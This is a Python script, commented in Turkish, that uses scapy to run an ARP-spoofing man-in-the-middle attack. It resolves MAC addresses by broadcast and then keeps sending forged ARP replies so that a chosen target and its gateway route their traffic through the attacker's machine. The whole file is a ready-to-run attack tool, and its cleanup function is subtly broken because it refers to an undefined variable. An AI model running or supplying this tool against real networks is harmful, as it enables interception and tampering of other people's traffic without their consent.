import optparse

import scapy.all as scapy
import time


def mac_bulucu(ip):
    arp_istek_paketi = scapy.ARP(pdst=ip)
    # scapy.ls(scapy.ARP()) #scapy.ls yardım komutudur.Bu fonksiyonun içine yardım almak istediğiniz fonksiyonu girince ekrana yardımı basar.

    arp_yayinlayici = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # bütün iplere default olarak bu mac adresini gönderdik.
    # scapy.ls(scapy.Ether())

    paket_birlestirici = arp_yayinlayici / arp_istek_paketi

    cevap_gelen_liste = scapy.srp(paket_birlestirici, timeout=1,verbose=False)[0] #verbose scapy'nin içinden gelen mesajları ekrana yazdırmamamıza yarar.
    #print(cevap_gelen_liste[0][1].hwsrc) #liste uzun. ve istediğimiz mac adresinin başında hwsrc var. Bu kısayollar direkt mace ulaşmayı sağlayacak.
    return cevap_gelen_liste[0][1].hwsrc


def MIDM(target_ip,zehirlenecek_ip):

    target_mac=mac_bulucu(target_ip) #Hedef mac adresini bulmak için ip'yi mac bulma fonksiyonuna gönderiyoruz
    arp_cevabi=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=zehirlenecek_ip) #MIDM Yapılıyor..
    scapy.send(arp_cevabi,verbose=False) #verbose scapy'nin içinden gelen mesajları ekrana yazdırmamamıza yarar.
''' #scapy.ls(scapy.ARP())
hwtype     : XShortField                         = 1               ('1')
ptype      : XShortEnumField                     = 2048            ('2048')
hwlen      : FieldLenField                       = None            ('None')
plen       : FieldLenField                       = None            ('None')
op         : ShortEnumField                      = 1               ('1')         ==Bunu 2 yapınca yönlendirme işlemleri açılır.
hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = '08:00:27:db:96:6a' ('None')   == Hedefin mac adresi
psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = '10.0.2.15'     ('None') ==Bizim ip == bunu modeminkine çeviriyoruz.
hwdst      : MultipleTypeField (MACField, StrFixedLenField) = '00:00:00:00:00:00' ('None')
pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = '0.0.0.0'       ('None')  ==Hedef ip


'''

def MIDM_bitirme(targettt_ip,zehirlenecekkk_ip):

    target_mac=mac_bulucu(targettt_ip) #Hedef
    zehirlenecek_mac=mac_bulucu(zehirlenecekkk_ip) #Modem
    arp_cevabi=scapy.ARP(op=2,pdst=targettt_ip,hwdst=target_mac,psrc=zehirlenecekkk_ip,hwsrc=zehirlenecekkk_mac) #eski maci yerine koyuyoruz.
    scapy.send(arp_cevabi,verbose=False,count=6) #verbose scapy'nin içinden gelen mesajları ekrana yazdırmamamıza yarar.


def kullanicidan_ip():

    parse_object=optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="targett_ip",help="Hedef ip'yi giriniz")
    parse_object.add_option("-m","--Modem",dest="modem_ip",help="Modem ip(zehirlenecek ip) giriniz")
    options=parse_object.parse_args()[0]

    if not options.targett_ip:
        print("Hedef ip girin")

    if not options.modem_ip:
        print("Modem ip girin")

    return options


hedef_ipler=kullanicidan_ip()
hedef_ip=hedef_ipler.targett_ip
hedef_modem_ip= hedef_ipler.modem_ip

number = 0
try: #Ctrl C 'ye bastığımızda gelen hatayı ekrandan silmek için try ve except.
    while True:
        MIDM(hedef_ip,hedef_modem_ip)
        #print("Hedefe modemsiniz..")
        MIDM(hedef_modem_ip,hedef_ip)
        number+=2
        print("\rGönderilen paket sayısı: "+str(number),end="")
        #print("Modeme hedef ipsi ile görünüyorsunuz..")
        #print("Tebrikler.. MIDM başarılı")
        time.sleep(3)

except KeyboardInterrupt: #ekrana gelen hata. Bu geldiğinde bunları yap:
    print("\nProgram kapatılıp, saldırı sonlandırılıyor..")
    MIDM_bitirme(hedef_ip, hedef_modem_ip)
    MIDM_bitirme(hedef_modem_ip, hedef_ip)










